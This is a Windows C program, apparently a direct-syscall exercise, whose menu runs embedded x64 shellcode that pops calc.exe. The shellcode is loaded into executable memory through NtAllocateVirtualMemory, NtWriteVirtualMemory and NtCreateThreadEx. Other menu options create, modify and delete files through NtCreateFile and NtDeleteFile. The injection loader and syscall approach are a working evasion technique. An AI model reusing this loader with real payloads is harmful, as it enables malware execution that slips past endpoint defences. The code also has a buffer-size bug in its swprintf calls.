#include "util.h"
#include "syscall_header.h"

wchar_t* input_filename() {
    wchar_t* fileName = (wchar_t*)malloc(260 * sizeof(wchar_t));
    if (fileName == NULL) {
        printf("메모리 할당 실패\n");
        return NULL;
    }

    printf("파일 이름을 입력하세요 (예: example.txt): ");
    fgetws(fileName, 260, stdin);

    // 경로 끝에 개행 문자 제거
    size_t len = wcslen(fileName);
    if (len > 0 && fileName[len - 1] == L'\n') {
        fileName[len - 1] = L'\0';  // 개행 문자 제거
    }

    return fileName;
}

void createFile(const wchar_t* fileName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("Failed to load ntdll.dll\n");
        return;
    }

    RtlInitUnicodeString_t RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
    if (!RtlInitUnicodeString) {
        printf("RtlInitUnicodeString 함수 로드 실패\n");
        return;
    }

    UNICODE_STRING filePath;

    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    printf("Current directory: \"%s\"\n", currentDir);

    int len = MultiByteToWideChar(CP_ACP, 0, currentDir, -1, NULL, 0);
    wchar_t* wCurrentDir = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, currentDir, -1, wCurrentDir, len);

    wchar_t fileFullPath[MAX_PATH];
    swprintf(fileFullPath, sizeof(fileFullPath), L"\\??\\%ls\\%ls", wCurrentDir, fileName);
    wprintf(L"Full path for new file: \"%ls\"\n", fileFullPath);

    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttrs;
    UNICODE_STRING uniFilePath;

    // UNICODE_STRING 객체 초기화
    RtlInitUnicodeString(&uniFilePath, fileFullPath);
    InitializeObjectAttributes(&objAttrs, &uniFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtCreateFile(&fileHandle, FILE_WRITE_DATA | SYNCHRONIZE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    // 상태 코드 확인 및 출력
    if (status == STATUS_SUCCESS) {
        printf("파일 생성 성공: %ls\n", fileFullPath);
        CloseHandle(fileHandle);
    }
    else {
        printf("파일 생성 실패: 0x%X\n", status);
    }
}

void modifyFile(const wchar_t* fileName, const char* content) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("Failed to load ntdll.dll\n");
        return;
    }

    RtlInitUnicodeString_t RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
    if (!RtlInitUnicodeString) {
        printf("RtlInitUnicodeString 함수 로드 실패\n");
        return;
    }

    UNICODE_STRING filePath;

    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);

    int len = MultiByteToWideChar(CP_ACP, 0, currentDir, -1, NULL, 0);
    wchar_t* wCurrentDir = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, currentDir, -1, wCurrentDir, len);

    wchar_t fileFullPath[MAX_PATH];
    swprintf(fileFullPath, sizeof(fileFullPath), L"\\??\\%ls\\%ls", wCurrentDir, fileName);

    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttrs;
    UNICODE_STRING uniFilePath;

    RtlInitUnicodeString(&uniFilePath, fileFullPath);
    InitializeObjectAttributes(&objAttrs, &uniFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // 기존 파일 열기
    NTSTATUS status = NtCreateFile(
        &fileHandle, FILE_GENERIC_WRITE, &objAttrs, &ioStatus,
        NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE,
        FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (status == STATUS_SUCCESS) {

        status = NtWriteFile(fileHandle, NULL, NULL, NULL, &ioStatus,
            (PVOID)content, (ULONG)strlen(content), NULL, NULL);

        if (status == STATUS_SUCCESS) {
            printf("파일이 수정 되었습니다.\n");
        }
        else {
            printf("파일 수정 실패: 0x%X\n", status);
        }

        CloseHandle(fileHandle);
    }
    else {
        printf("파일 열기 실패: 0x%X\n", status);
    }
}

void deleteFile(const wchar_t* fileName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("Failed to load ntdll.dll\n");
        return;
    }

    RtlInitUnicodeString_t RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
    if (!RtlInitUnicodeString) {
        printf("RtlInitUnicodeString 함수 로드 실패\n");
        return;
    }

    UNICODE_STRING filePath;

    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);

    int len = MultiByteToWideChar(CP_ACP, 0, currentDir, -1, NULL, 0);
    wchar_t* wCurrentDir = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, currentDir, -1, wCurrentDir, len);

    wchar_t fileFullPath[MAX_PATH];
    swprintf(fileFullPath, sizeof(fileFullPath), L"\\??\\%ls\\%ls", wCurrentDir, fileName);

    OBJECT_ATTRIBUTES objAttrs;
    UNICODE_STRING uniFilePath;

    RtlInitUnicodeString(&uniFilePath, fileFullPath);
    InitializeObjectAttributes(&objAttrs, &uniFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtDeleteFile(&objAttrs);
    if (status == STATUS_SUCCESS) {
        printf("파일 삭제 성공: %ls\n", fileFullPath);
    }
    else {
        printf("파일 삭제 실패: 0x%X\n", status);
    }
}

int main() {
    get_ssn();

    const wchar_t* file_name;
    PVOID allocBuffer = NULL;
    SIZE_T buffSize = 0x1000;
    unsigned char shellcode[] = "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";

    int select = 0;

    printf("Select Menu\n");
    printf("------------------------------------\n");
    printf("1. Execute calc.exe\n");
    printf("2. Create File\n");
    printf("3. Modify File\n");
    printf("4. Delete File\n");
    printf("------------------------------------\n");
    printf("> ");
    scanf_s("%d", &select);

    while (getchar() != '\n');

    switch (select) {
    case 1:
        NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        ULONG bytesWritten;
        NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
        HANDLE hThread;
        NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
        NtWaitForSingleObject(hThread, FALSE, NULL);
        break;
    case 2:
        file_name = input_filename();
        createFile(file_name);
        break;
    case 3:
        file_name = input_filename();
        char content[256];
        printf("추가할 내용을 입력하세요: ");
        //getchar(); // 버퍼 비우기
        fgets(content, 256, stdin);
        modifyFile(file_name, content);
        break;
    case 4:
        file_name = input_filename();
        deleteFile(file_name);
        break;
    default:
        printf("Error!\n");
        break;
    }

    return 0;
}
